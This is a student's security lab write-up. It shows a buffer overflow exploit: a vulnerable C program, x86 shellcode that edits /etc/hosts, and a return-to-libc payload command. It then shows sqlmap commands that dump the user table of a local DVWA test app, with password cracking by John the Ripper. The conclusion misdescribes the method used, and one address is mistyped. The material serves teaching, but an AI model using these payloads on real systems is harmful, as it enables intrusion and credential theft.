# Lab #1,22110086, Tran Van Tuyen, 241INSE330380E_02FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

and a shellcode in asm. This shellcode add a new entry in hosts file

```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux.
  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  **Answer 1**: Must conform to below structure:

Description text (optional)

For this lab, i will use a docker container to do. It will be mapped to my Seclabs directoy

![image](https://github.com/user-attachments/assets/f8d69d8d-5ee1-43b7-a8fe-1e20a9e126f2)

Then i will compile C asm program and C program
![image](https://github.com/user-attachments/assets/96923428-54c0-430c-a2b3-1ab49faf51e1)

I will use an older bash and turn off randomly given stack value.

![image](https://github.com/user-attachments/assets/2225b827-1838-4506-aab8-6c3726acf7ec)

The pwd of the file_del-1 `/home/seed/seclabs/Security-labs/Software/buffer-overflow`

![image](https://github.com/user-attachments/assets/861a0ba4-3c32-4691-9960-4ac4952850db)

Create a global environment varibale name **my_path** using `/home/seed/seclabs/Security-labs/Software/buffer-overflow/file_del-1`

![image](https://github.com/user-attachments/assets/d32c143b-4c98-45f4-8d19-c4f5d0c9f00e)

The stack frame of main function

![image](https://github.com/user-attachments/assets/6ecff85e-ae0a-450c-b8fb-d2f03d3f1278)

Now , I will find the address of system and exit and that string of varibale

![image](https://github.com/user-attachments/assets/7bcb3c72-ec57-4c31-8cbd-f745af79ceb1)

- Address value of system: `0xf7e50db0` will be inserted with format \xb0\x0d\xe5\xf7

- Address value of exit: `0xf7e449e0` will be inserted with format \xe0\x49\xe4\f7

- Address value of the string of environment: `0xffffdee3` will be inserted with format `\xe3\xde\xff\xff`

so command is

```
    r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\xe3\xde\xff\xff')")
```

![image](https://github.com/user-attachments/assets/18cf6af2-122b-4d8c-b007-11b991489f4f)

-before attack
![image](https://github.com/user-attachments/assets/75ec4ae6-5867-4757-80a9-faf67641d91d)

-after attack
![image](https://github.com/user-attachments/assets/74cdbbf9-f30e-4f29-b707-4dc623f267a9)

==>Complete lab

> **Conclusion**: This exercise demonstrated how a buffer overflow vulnerability in a C program could be exploited to execute arbitrary code (in this case, modifying /etc/hosts). We used environment variables to store shellcode and manipulated the stack to trigger its execution by overwriting the return pointer.

# Task 2: Attack on the database of Vulnerable App from SQLi lab

- Start docker container from SQLi.
  No i use virtual machine , so dont need Start docker

  - Access DVWA:http://localhost to access the DVWA interface. Login with the default credentials:

Username: admin
Password: password

![image](https://github.com/user-attachments/assets/86ecb794-75f6-4bcc-a1ef-cf35589ac95b)

> Then, change the Security Level to Low under the "DVWA Security" settings.

![image](https://github.com/user-attachments/assets/df8238fc-d761-484c-913d-335d7a65b397)

- Install sqlmap.

i have splMap so i only need update with command
`sudo apt-get update`

![image](https://github.com/user-attachments/assets/b0f38b60-8074-472f-b1b8-a37d5b21b656)

cd sqlmap

![image](https://github.com/user-attachments/assets/2aa8b4bb-fee8-438d-8120-55266f758d67)

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
Cookie of the website
![image](https://github.com/user-attachments/assets/d33ceb26-2d5b-49e5-a582-933770e9cd61)

- run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=p7oluqfdb8o0tb5trnl2lmf9c1; security=low" --dbs` to get information about all available databases

![image](https://github.com/user-attachments/assets/175a9052-5415-49ac-93b7-f4607e955d4d)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

- run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=p7oluqfdb8o0tb5trnl2lmf9c1; security=low" -D dvwa --tables` to get tables

![image](https://github.com/user-attachments/assets/37c568dd-abc0-4e52-9adb-142a2bafd0dc)

-run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=p7oluqfdb8o0tb5trnl2lmf9c1; security=low" -D dvwa -T users --dump` to get users information

![image](https://github.com/user-attachments/assets/482061e7-e270-491e-8513-61fb89a0f3a5)

> answer after run

![image](https://github.com/user-attachments/assets/5a482ce2-588b-476f-ac88-89b5a96477a1)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

![image](https://github.com/user-attachments/assets/96e51b7d-84b9-4538-8987-bb2ac4afeacb)
